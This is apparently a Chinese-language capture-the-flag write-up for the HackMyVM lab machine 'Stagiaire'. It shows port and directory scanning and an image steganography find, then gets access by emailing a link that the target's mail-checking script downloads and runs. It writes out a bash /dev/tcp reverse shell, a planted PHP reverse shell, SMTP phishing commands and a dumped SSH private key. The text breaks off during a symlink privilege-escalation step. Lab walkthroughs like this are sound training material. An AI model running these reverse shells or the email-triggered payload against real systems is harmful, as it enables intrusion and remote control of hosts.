---
title: Stagiaire
author: hgbe02
date: 2024-08-08 21:25:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Stagiaire.html"
---

# Stagiaire

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130194.png" alt="image-20240712183757550" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130196.png" alt="image-20240808181121698" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ rustscan -a $IP -- -sCV                
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.10.104:22
Open 192.168.10.104:80
Open 192.168.10.104:25

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8iGU6tf/bJeTz4LffU0v/j8xZ1L2dzVf0uRJddhZ8VYE5Vu0s+jw2bZUsQO04rPBZr2E8s2EHH8y92oIV83tT1Af4aCPY70U3RWun/lzWiXYRnpd3WLh/Zkqy1r/KXWm0cZdnfMFOpaOm15Drqrf9xhtPLFwRMjvBncSoWsDJ6iugZSYfvCieopC2DpcAoDg+JKnghcsLPpSchPcHdC99QJSq7FUeSLR6XknHAYqx08c/gGlsddcZV83+txxf6xkIxLZY0S+0uS+AZ8eeRhgrT/euWboWzOnNJKXTnKhg0t4q7gSM9jEIVltjxEAysM6ioy7ht5nj2bdDdGWpp1PpG8tlzqTOfuD+V92Tr2pyqfQFJJvOlseCWmUo9MPiDDyQthbWWQ2u8X+imHycBaZgJ0EMmren0mj6iDdG/q8sb2q1J/SgFiod+2nahTXDAQ7I9F3GbguIAAIInZuVsXDFUbr58Y5bb+4DmcTX8jiLzlk2iruVhlBp5EGrlzMOpF0=
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIlEQHCjgDvuOLB3N4GxSwqHR5HvE5SVWtLTzh50O4xBFnez4SCGcE9tlUSutAUADQb3hG8X31MBxORqH31UJ9c=
|   256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAu6QlOK+lvy3uZTE3EAS5lULanS7qx17oCiOaBOpDdX
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: debian.numericable.fr, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-23T15:24:56
| Not valid after:  2031-10-21T15:24:56
| MD5:   3148:4bd1:f95c:b5f5:c51a:32e6:56e5:9e63
| SHA-1: 0dac:969a:b132:8eed:c8ff:c452:92cf:7ad1:6260:d92e
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUG5h9bEwksEP/V7xtYd5xqWxeVdYwDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIxMTAyMzE1MjQ1NloXDTMxMTAyMTE1
| MjQ1NlowETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA76rA+k3OCZjGqkiiQWOjqrji2US/gxB4FmFo2JYRj5/axhcNEpiE
| HV1SkH8n66jIXj11Hrhgmyzp1W7gwn7zzPgs/HBXTFS1uTNwTaAFJ/9DKuPk7EsI
| VQOLWLn65jrLQdRVzKxnaAjSXUzVvf4b0cHoKginHCQW9g8W+RxJ+6WhN3olKa4j
| 9dUGc0izrAVmbMFLp/YDx4lTTi7JVAJxloSugOsTwZAu/UuqXmxfuw1Wl2DYt9M2
| wP8bM5AxceoxgDF/0GXfYDbV5Ymzdmsm2mc7FYjVPPN9etk+sctZqYsSIWx4HIPl
| n4jH/bAd858vsJchpbIP8ZXHUfjtqCIkeQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAzf+9wOyAg+TEKEHC
| YTY5LhmgD5aT6DetEYPkIeL62uDEJkzyaXksV3jW0F2NbXU2iGvEbEgKy7m0q/0G
| qkf6rRZ2eEqE4dt0WoO4XVvVSFZ5Cl37JzqXILunxJW5fymSkqhfG0mNW+dVUaei
| MIp1Q6upMX+UADVSisaIPtPCkvwk+hqbRpOFqQ+4ZCzF+Ne+BQayOYFhFPj11/jo
| HPfsa+sKVxRdN3lMOWZitTR9yM2Xd17GE44LAGwMC9ypVxp/SiEuMHsLbVZGDaQT
| /KuD/lZoKHOC92Nbv9USaEJlqmP67UifBBCHv3jj8Zr1UiRS4ISbt0Qultlp+yC9
| R4kiUQ==
|_-----END CERTIFICATE-----
80/tcp open  http    syn-ack Apache httpd 2.4.51
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Protected area
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.51 (Debian)
Service Info: Hosts:  debian.numericable.fr, stagiaire.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ gobuster dir -u http://192.168.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -b 301,401,403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301,401,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 115429 / 882244 (13.08%)[ERROR] Get "http://192.168.10.104/news_stories.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/xmlhelp.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/8165.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/8165.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 146209 / 882244 (16.57%)[ERROR] Get "http://192.168.10.104/19545.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/19545.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/3779.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/3779": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/TEASES": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/3779.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.10.104/19545": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 173191 / 882244 (19.63%)
[!] Keyboard interrupt detected, terminating.
Progress: 173204 / 882244 (19.63%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ whatweb http://$IP
http://192.168.10.104 [401 Unauthorized] Apache[2.4.51], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.10.104], Title[401 Unauthorized], WWW-Authenticate[Protected area][Basic]
```

端口扫描阶段发现存在dns解析，添加一下：

```text
192.168.10.104    stagiaire.hmv
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130197.png" alt="image-20240808183042404" style="zoom:50%;" />

### 敏感端口

参考 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp 进行信息搜集：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ nmap --script smtp-enum-users $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 06:35 EDT
Nmap scan report for stagiaire.hmv (192.168.10.104)
Host is up (0.0026s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
| smtp-enum-users: 
|_  root
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

### web测试

看一下其他的请求方法可不可以访问页面，发现是可以的，但是必须要知道`index.php`：

```bash
# curl -s http://$IP/index.php -X HEAD
# curl -s http://$IP/index.php -X PUT
# curl -s http://$IP/index.php -X DELETE
# curl -s http://$IP/index.php -X PATCH
curl -s http://$IP/index.php -X POST
<img src="madonna.jpg" alt="">
```

下载下来看一下有无隐写：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s http://$IP/madonna.jpg -X POST -O madonna.jpg

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ stegseek madonna.jpg -wl /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "freeze"
[i] Original filename: "info.txt".
[i] Extracting to "madonna.jpg.out".

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ cat madonna.jpg.out 
Don't waste your time I hate CTFs lol

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s http://$IP/info.txt -X POST             
/madonnasecretlife

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s http://$IP/madonnasecretlife -X POST
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.10.104/madonnasecretlife/">here</a>.</p>
<hr>
<address>Apache/2.4.51 (Debian) Server at 192.168.10.104 Port 80</address>
</body></html>

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s http://$IP/madonnasecretlife/ -X POST
<!doctype html>
<html lang="en-US" >
<head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Madonna &#8211; Just another WordPress site</title>
<meta name='robots' content='noindex, nofollow' />
<link rel='dns-prefetch' href='//stagiaire.hmv' />
<link rel='dns-prefetch' href='//s.w.org' />
........
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130198.png" alt="image-20240808185425287" style="zoom:50%;" />

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ whatweb http://192.168.10.104/madonnasecretlife/
http://192.168.10.104/madonnasecretlife/ [200 OK] Apache[2.4.51], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[192.168.10.104], MetaGenerator[WordPress 5.8.1], PoweredBy[--], Script, Title[Madonna &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.8.1]
```

是这个框架，不确定是不是利用这个洞进行的：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ searchsploit WordPress 5.8.1                             
----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                                    | php/webapps/51042.txt
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                        | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                  | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                                | php/webapps/48918.sh
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results
```

都是插件漏洞，等下不行的话回来尝试一下是不是。

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s -X POST http://stagiaire.hmv/madonnasecretlife/?p=1 | html2text
Skip_to_content
Madonna
Just another WordPress site

****** Welcome to the official Madonna website ******
This blog is about my new internship! I’m going back to school!
Published October 24, 2021By madonna
Categorized as Uncategorized

***** 4 comments *****
   1.
      Admin says:
      October_24,_2021_at_9:59_am
      Welcome Madonna! I hope you enjoy your internship!
      Reply
   2.
      Madonna says:
      October_24,_2021_at_10:05_am
      Thank you so much! I can’t wait to get some new stuff
      Reply
         1.
            Admin says:
            October_24,_2021_at_10:07_am
            Great! Don’t forget to check your email often!
            Reply
               1.
                  madonna says:
                  October_24,_2021_at_10:10_am
                  Yes I check every minute! I have a lot of fans who send me
                  emails, I open them all !!!!
                  Reply
***** Leave a comment Cancel_reply *****
Your email address will not be published. Required fields are marked *
Name * [author                        ]
Email * [Unknown INPUT type]
Website [Unknown INPUT type]
⁰ Save my name, email, and website in this browser for the next time I comment.
[Post Comment]
Search
[Unknown INPUT type]Search
***** Recent Posts *****
    * Welcome_to_the_official_Madonna_website
***** Recent Comments *****
   1. madonna on Welcome_to_the_official_Madonna_website
   2. Admin on Welcome_to_the_official_Madonna_website
   3. Madonna on Welcome_to_the_official_Madonna_website
   4. Admin on Welcome_to_the_official_Madonna_website

Madonna
Proudly powered by WordPress.
```

```text
Yes I check every minute! I have a lot of fans who send me emails, I open them all !!!!
```

提到了邮箱，尝试利用之前的那个敏感端口。

### smtp反弹shell

参考 https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#sending-an-email-from-linux-console

```bash
sendEmail -t madonna@stagiaire.hmv -f hack@attacker.com -s 192.168.10.104 -u "fucku" -a revshell.php
```

但是没成功，只能老老实实发邮件了。。。

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ head revshell.php 

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.10.101';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.10.104 - - [08/Aug/2024 08:08:17] "GET /revshell.php HTTP/1.1" 200 -
```

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ telnet 192.168.10.104 25
Trying 192.168.10.104...
Connected to 192.168.10.104.
Escape character is '^]'.
220 debian.numericable.fr ESMTP Postfix (Debian/GNU)
HELO
501 Syntax: HELO hostname
HELO stagiaire.hmv
250 debian.numericable.fr
MAIL FROM: hack@kali.hmv
250 2.1.0 Ok
RCPT TO: madonna@stagiaire.hmv  
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
http://192.168.10.101:8888/revshell.php
.
250 2.0.0 Ok: queued as 6F9CD618D0
```

但是没有弹回来，嘶。。。仔细想了一下，发现需要发送的是一个钓鱼链接，尝试修改payload：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ vim shell1

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ cat shell1                    
bash -c 'exec bash -i &>/dev/tcp/192.168.10.101/1234 <&1'

┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
192.168.10.104 - - [08/Aug/2024 08:22:17] code 404, message File not found
192.168.10.104 - - [08/Aug/2024 08:22:17] "GET /revshell.php HTTP/1.1" 404 -
192.168.10.104 - - [08/Aug/2024 08:22:17] "GET /revshell.html HTTP/1.1" 200 -
192.168.10.104 - - [08/Aug/2024 08:23:17] code 404, message File not found
192.168.10.104 - - [08/Aug/2024 08:23:17] "GET /revshell.php HTTP/1.1" 404 -
192.168.10.104 - - [08/Aug/2024 08:23:17] "GET /revshell.html HTTP/1.1" 200 -
192.168.10.104 - - [08/Aug/2024 08:24:17] code 404, message File not found
192.168.10.104 - - [08/Aug/2024 08:24:17] "GET /revshell.php HTTP/1.1" 404 -
192.168.10.104 - - [08/Aug/2024 08:24:17] "GET /revshell.html HTTP/1.1" 200 -
192.168.10.104 - - [08/Aug/2024 08:24:18] "GET /shell1 HTTP/1.1" 200 -
```

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ telnet 192.168.10.104 25
Trying 192.168.10.104...
Connected to 192.168.10.104.
Escape character is '^]'.
220 debian.numericable.fr ESMTP Postfix (Debian/GNU)
MAIL FROM: hack@kali.hmv
250 2.1.0 Ok
RCPT TO: madonna@stagiaire.hmv
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
http://192.168.10.101:8888/shell1      
.
250 2.0.0 Ok: queued as C08E6618D0
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130199.png" alt="image-20240808202500448" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) madonna@stagiaire.hmv:/home/madonna$ ls -la
total 40
drwx------ 4 madonna madonna 4096 Aug  8 13:35 .
drwxr-xr-x 5 root    root    4096 Oct 28  2021 ..
lrwxrwxrwx 1 root    root       9 Oct 24  2021 .bash_history -> /dev/null
-rw-r--r-- 1 madonna madonna  220 Oct 24  2021 .bash_logout
-rw-r--r-- 1 madonna madonna 3526 Oct 24  2021 .bashrc
-rwxr-xr-x 1 madonna madonna   98 Oct 24  2021 .checkmail
drwxr-xr-x 3 madonna madonna 4096 Oct 24  2021 .local
-rwxr-xr-x 1 madonna madonna   58 Aug  8 14:25 love
-rw-r--r-- 1 madonna madonna  807 Oct 24  2021 .profile
-rw-r--r-- 1 madonna madonna   66 Oct 24  2021 .selected_editor
drwx------ 2 madonna madonna 4096 Oct 24  2021 .ssh
(remote) madonna@stagiaire.hmv:/home/madonna$ cd .ssh/
(remote) madonna@stagiaire.hmv:/home/madonna/.ssh$ ls -la
total 16
drwx------ 2 madonna madonna 4096 Oct 24  2021 .
drwx------ 4 madonna madonna 4096 Aug  8 13:35 ..
-rw-r--r-- 1 madonna madonna  575 Oct 24  2021 authorized_keys
-rw------- 1 madonna madonna 2610 Oct 24  2021 id_rsa
(remote) madonna@stagiaire.hmv:/home/madonna/.ssh$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
(remote) madonna@stagiaire.hmv:/home/madonna/.ssh$ cat .checkmail
cat: .checkmail: No such file or directory
(remote) madonna@stagiaire.hmv:/home/madonna/.ssh$ cd ..
(remote) madonna@stagiaire.hmv:/home/madonna$ cat .checkmail
for x in $(grep http /var/mail/madonna) ; do curl $x -o love && chmod +x love && bash love ; done
(remote) madonna@stagiaire.hmv:/home/madonna$ cat love 
bash -c 'exec bash -i &>/dev/tcp/192.168.10.101/1234 <&1'
(remote) madonna@stagiaire.hmv:/home/madonna$ cat /etc/passwd | grep "/bin"
root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
madonna:x:1000:1000:,,,:/home/madonna:/bin/bash
mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false
tony:x:1001:1001:,,,:/home/tony:/bin/bash
paillette:x:1002:1002:,,,:/home/paillette:/bin/bash
(remote) madonna@stagiaire.hmv:/home/madonna$ cd ..
(remote) madonna@stagiaire.hmv:/home$ ls -la
total 20
drwxr-xr-x  5 root      root      4096 Oct 28  2021 .
drwxr-xr-x 18 root      root      4096 Oct 16  2021 ..
drwx------  4 madonna   madonna   4096 Aug  8 13:35 madonna
drwx---r-x  5 paillette paillette 4096 Oct 28  2021 paillette
drwx------  4 tony      tony      4096 Oct 31  2021 tony
(remote) madonna@stagiaire.hmv:/home$ cd paillette/
(remote) madonna@stagiaire.hmv:/home/paillette$ ls -la
total 40
drwx---r-x 5 paillette paillette 4096 Oct 28  2021 .
drwxr-xr-x 5 root      root      4096 Oct 28  2021 ..
lrwxrwxrwx 1 root      root         9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r-- 1 paillette paillette  220 Oct 28  2021 .bash_logout
-rw-r--r-- 1 paillette paillette 3526 Oct 28  2021 .bashrc
-rwxr-xr-x 1 paillette paillette   52 Oct 28  2021 .chmod
drwxr-xr-x 3 paillette paillette 4096 Oct 28  2021 .local
-rw-r--r-- 1 paillette paillette  807 Oct 28  2021 .profile
-rw-r--r-- 1 paillette paillette   66 Oct 28  2021 .selected_editor
drwx------ 2 paillette paillette 4096 Oct 28  2021 .ssh
drwxrwx--- 3 paillette www-data  4096 Oct 31  2021 tetramin
(remote) madonna@stagiaire.hmv:/home/paillette$ cat .chmod
cd /home/paillette/tetramin && /usr/bin/chmod 777 *
```

### 切换www-data用户

```bash
(remote) madonna@stagiaire.hmv:/home/paillette$ cd /var/www/html
(remote) madonna@stagiaire.hmv:/var/www/html$ ls -la
total 156
drwxr-xr-x 4 root     root       4096 Oct 30  2021 .
drwxr-xr-x 4 root     root       4096 Oct 31  2021 ..
-rw-r--r-- 1 root     root        142 Oct 30  2021 .htaccess
-rw-r--r-- 1 www-data www-data     51 Oct 23  2021 index.php
-rw-r--r-- 1 www-data www-data     19 Oct 24  2021 info.txt
drwx---rwx 2 www-data www-data   4096 Oct 30  2021 lab
-rw-r--r-- 1 www-data www-data 130054 Oct 24  2021 madonna.jpg
drwxr-xr-x 5 www-data www-data   4096 Aug  8 12:52 madonnasecretlife
(remote) madonna@stagiaire.hmv:/var/www/html$ cd lab
(remote) madonna@stagiaire.hmv:/var/www/html/lab$ ls -la
total 8
drwx---rwx 2 www-data www-data 4096 Oct 30  2021 .
drwxr-xr-x 4 root     root     4096 Oct 30  2021 ..
(remote) madonna@stagiaire.hmv:/var/www/html/lab$ nano revshell.php&&head revshell.php

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.10.101';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
(remote) madonna@stagiaire.hmv:/var/www/html/lab$ chmod +x revshell.php
```

访问弹回shell：

```bash
┌──(kali💀kali)-[~/temp/Stagiaire1]
└─$ curl -s -X POST http://192.168.10.104/lab/revshell.php
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408082130200.png" alt="image-20240808203243445" style="zoom:50%;" />

### 软链接提权

```bash
(remote) www-data@stagiaire.hmv:/home/paillette$ ls -la
total 40
drwx---r-x 5 paillette paillette 4096 Oct 28  2021 .
drwxr-xr-x 5 root      root      4096 Oct 28  2021 ..
lrwxrwxrwx 1 root      root         9 Oct 28  2021 .bash_history -> /dev/null
-rw-r--r-- 1 paillette paillette  220 Oct 28  2021 .bash_logout
-rw-r--r-- 1 paillette paillette 3526 Oct 28  2021 .bashrc
-rwxr-xr-x 1 paillette paillette   52 Oct 28  2021 .chmod
drwxr-xr-x 3 paillette paillette 4096 Oct 28  2021 .local
-rw-r--r-- 1 paillette paillette  807 Oct 28  2021 .profile
-rw-r--r-- 1 paillette paillette   66 Oct 28  2021 .selected_editor
drwx------ 2 paillette paillette 4096 Oct 28  2021 .ssh
drwxrwx--- 3 paillette www-data  4096 Oct 31  2021 tetramin
(remote) www-data@stagiaire.hmv:/home/paillette$ ./.chmod 
/usr/bin/chmod: changing permissions of 'ssh': Operation not permitted
(remote) www-data@stagiaire.hmv:/home/paillette$ cd tetramin/
(remote) www-data@stagiaire.hmv:/home/paillette/tetramin$ ls -la
total 12
drwxrwx--- 3 paillette www-data  4096 Oct 31  2021 .
drwx---r-x 5 paillette paillette 4096 Oct 28  2021 ..
